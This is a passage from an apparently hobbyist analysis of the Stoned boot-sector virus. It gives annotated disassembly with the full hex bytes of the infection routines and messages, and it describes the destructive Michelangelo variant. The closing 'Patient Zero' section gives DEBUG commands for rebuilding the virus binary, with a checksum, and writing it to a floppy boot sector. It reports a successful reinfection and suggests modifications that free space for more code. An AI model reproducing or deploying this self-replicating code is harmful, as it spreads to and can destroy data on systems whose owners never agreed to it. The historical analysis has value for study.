0134: BA 80 00          MOV     DX,$0080                ; Head = 0, Drive = 80
0137: CD 13             INT     $13                     ; Read current boot sector
0139: 72 13             JB      $014E                   ; Error ... skip it
013B: 0E                PUSH    CS                      ; Set DS ...
013C: 1F                POP     DS                      ; ... to CS
013D: BE 00 02          MOV     SI,$0200                ; Current boot sector data
0140: BF 00 00          MOV     DI,$0000                ; Virus data
0143: AD                LODSW                           ; Get first word of boot sector
0144: 3B 05             CMP     AX,[DI]                 ; Same as virus?
0146: 75 11             JNZ     $0159                   ; No ... infect it
0148: AD                LODSW                           ; Yes ... try second word
0149: 3B 45 02          CMP     AX,[DI+$02]             ; Boot sector looks like virus?
014C: 75 0B             JNZ     $0159                   ; No ... infect it
```

Once the message is printed (or skipped), the virus continues at 012A. Here the virus attempts to load the bootsector from a fixed-disk. If an error occurs, 
the virus continues with the normal boot up process. This time the error checking is needed since the error is likely -- it could mean that there is no fixed-disk 
in the computer. Ah, those were the days!

If the first four bytes of the loaded bootsector match the virus, the disk is already infected and the original bootsector is executed with the following section of 
code. Otherwise, the hard-disk infection continues at 0159.

```plainCode
; No matter how virus loaded, it infects only floppy disks that get a copy of the
; memory-resident copy of the virus. We want floppies to have media type = 0.
014E: 2E C6 06 08 00 00 MOV     BYTE PTR [CS:$0008],$00 ; Media type = floppy.
0154: 2E FF 2E 11 00    JMP     [CS:$0011]              ; Continue with normal boot sector
```

This is how the virus finishes its loading by executing the original bootsector, which was loaded from disk earlier. Once again an indirect jump is used where a 
direct, intrasegment jump is better. The direct jump occupies the same space (five bytes) and executes a little faster. Replacing the five bytes at 0154 with a 
direct jump eliminates the need for the four bytes of storage at 0011. That brings our savings up to 16 bytes.

The very last thing the virus does before turning control over to the original bootsector is change the media-type flag to 0 (floppy) no matter how the virus 
booted. Once it is loaded into memory, the virus only infects floppies. To infect a floppy, the virus copies the entire memory-resident virus to the bootsector 
of the disk -- the media-type flag is set to zero for once and for all.

```plainCode
; Infect hard-drive
0159: 2E C6 06 08 00 02 MOV     BYTE PTR [CS:$0008],$02 ; Store virus on C: with flag set
015F: B8 01 03          MOV     AX,$0301                ; Write 1 sector
0162: BB 00 02          MOV     BX,$0200                ; Original boot sector
0165: B9 07 00          MOV     CX,$0007                ; Cyl = 0, Sec = 7
0168: BA 80 00          MOV     DX,$0080                ; Head = 0, Drive = 80
016B: CD 13             INT     $13                     ; Store original boot in FAT
016D: 72 DF             JB      $014E                   ; Error ... out of here
;
; Sectors are always 512 bytes (0200 hex). A fixed-disk's bootsectors contains four
; partition descriptors. These descriptors describe the partitions of the fixed-disk
; and must be present in the infected sector - this code copies the descriptors into 
; the virus sector buffer before writing it to disk.
016F: 0E                PUSH    CS                      ; Set DS ...
0170: 1F                POP     DS                      ; ... to CS
0171: 0E                PUSH    CS                      ; Set ES ...
0172: 07                POP     ES                      ; ... to CS
0173: BE BE 03          MOV     SI,$03BE                ; Copy partition ...
0176: BF BE 01          MOV     DI,$01BE                ; ... descriptors ...
0179: B9 42 02          MOV     CX,$0242                ; ... into ...
017C: F3 A4             REPZ    MOVSB                   ; ... virus sector buffer.
017E: B8 01 03          MOV     AX,$0301                ; Write one sector
0181: 33 DB             XOR     BX,BX                   ; Offset 0
0183: FE C1             INC     CL                      ; Cyl = 0, Sec = 1
0185: CD 13             INT     $13                     ; Write infected boot sector
0187: EB C5             JMP     $014E                   ; Continue with normal boot sector
;
; Stoned Message
; $07,'Your PC is now STONED!',$07,$0d,$0a,$0a,$00
0189: 07 59 6F 75         
018D: 72 20 50            
0190: 43 20 69               
0193: 73 20 6E             
0196: 6F                    
0197: 77 20 53              
019A: 54 4F 4E               
019D: 45                     
019E: 44 21 07              
01A1: 0D 0A 0A 00             
;
; Extra Message
; This is part of the virus but is never printed on the screen (notice no CR/LF on the end)
; 'LEGALISE MARIJUANA!'
01A5: 4C 45 47 41           
01A9: 4C 49 53             
01AC: 45 20 4D 41           
01B0: 52 49 4A             
01B3: 55 41 4E 41 21
```
      
As the above code shows, infecting a fixed-disk's bootsector is slightly more complicated. The first half of the sector contains a normal 
bootsector program, but the last half contains a special data-area that describes all of the partitions on the drive. The flags in this area 
indicate which partition is active and what kind of file-system each partition contains. The virus must be careful to preserve this 
partition-table before replacing the existing bootsector. The string operation at 017C copies the partition table from the end of the original 
bootsector onto the end of the virus.

Interestingly, one mutation of this virus known as the Monkey Virus dropped this check in order to make room for other functionality. Most operating systems 
depend on the information in the partition-table, and a Monkey infested fixed-disk is often unusable.

At 0189 we see the famous "stoned" message. Note the 07 character embedded in the text. When printed in teletype mode, this character rings the bell (or beeps 
the speaker).

Notice the ASCII string beginning at 01A5. This string has no terminating 0 or carriage-return or line-feed. Even though the data is part of the virus, it is 
just a signature; nobody ever sees it -- except, of course, computer archeologists like you! Many variations of the virus simply extend the printed message 
into this area.

One variation of this virus, the famous Michelangelo virus, contains a malicious code fragment in place of the harmless message routine. The code checks the 
system clock, and on March 6th, it enters an endless loop of filling up the sectors on the disk with the bootsector. Since the FAT table is first on the disk, 
Michelangelo renders a disk useless in the blink of an eye.

Space is a problem for bootsector viruses -- a floppy bootsector is only 512 bytes long, and on a fixed-disk, the partition-table begins at offset 01BE. This 
gives the virus only 1BE bytes to work with, yet the Stoned virus does quite a lot with several bytes to spare. If you want to make modifications to the virus, 
you can re-compile it with the recommended changes and squeeze out an extra 16 bytes. You could even ditch the message (and printing routine) completely if you 
need space for more code.

# Patient Zero

We have seen how the Stoned virus spreads from one infected disk to another, but how did the first floppy get infected? The procedure is actually very easy -- you 
already have all the tools you need to bring this virus back to life!

First, you need a boot-floppy made with "format /s". The Stoned virus was designed for 360K 5.25" floppies. I had bad luck trying to put the 
virus on a 3.5" disk.

The virus copies the original bootsector to cylinder 0, sector 3, head 1 of the floppy. You can do this with DEBUG (a standard command-prompt utility shipped 
with all PC operating systems). Using the assembler built into DEBUG, you can copy the bootsector to the expected holding place as shown with the DEBUG session below:

```
>debug
- L 200 0 0 1
- A
  mov ax,0301
  mov bx,0200
  mov cx,0003
  mov dx,0100
  int 13
  ret
<enter>
- G
- Q
```

The 'L' command loads the bootsector into the current segment at offset 200. Next, you use the 'A' command to assemble a small program fragment. The assembler 
will assemble your program at offset 0100 by default. (This is a throw-back to the days when COM files were common. COM files have one segment and load just 
above their 256-byte Program Segment Prefix). The 'G' command executes the program you just entered.

Next, you must get a binary version of the Stoned virus. The easiest way is to use DEBUG to enter the values directly from the disassembly above into memory in 
the current segment at offset 0100. Remember that my listing shows words with the bytes in readable-order. You must reverse the byte-order of all four-digit 
numbers in the above listing as you enter them into memory.

You might want to enter the bytes into a text-file and write a C parser to convert the ASCII into a binary file. I tested this approach, and the single-byte-tally 
checksum of the program is 189 (BD in hex). No matter which technique you use, you should be able to type at least two digits byte every five seconds. At that rate, 
you can punch in the virus from the listing in about 40 minutes.

The DEBUG session below shows how to load the virus from a binary file named A:\STONED.BIN into the current segment at offset 0100. We can then use the DEBUG 'W' 
command to write the virus into the bootsector of drive 0 (the floppy).

```
>debug a:\stoned.bin
- W 100 0 0 1
- Q
```

Congratulations! You now have a floppy infected with the Stoned virus. I booted from the floppy on an old 286 machine I keep around the house for just 
such experiments. (It is almost an archeological find in itself). After several boots, I got the signature Stoned message, and I used DEBUG to look at the 
bootsector of the C: drive. Sure enough, the virus was there. I formatted a new floppy in the A: drive and used DEBUG to look at its bootsector -- there was 
the virus as expected, alive again after all these years.

# Corrections

I had originally said fixed-disks had 1K sectors. tkchia corrected me on that. Thanks!
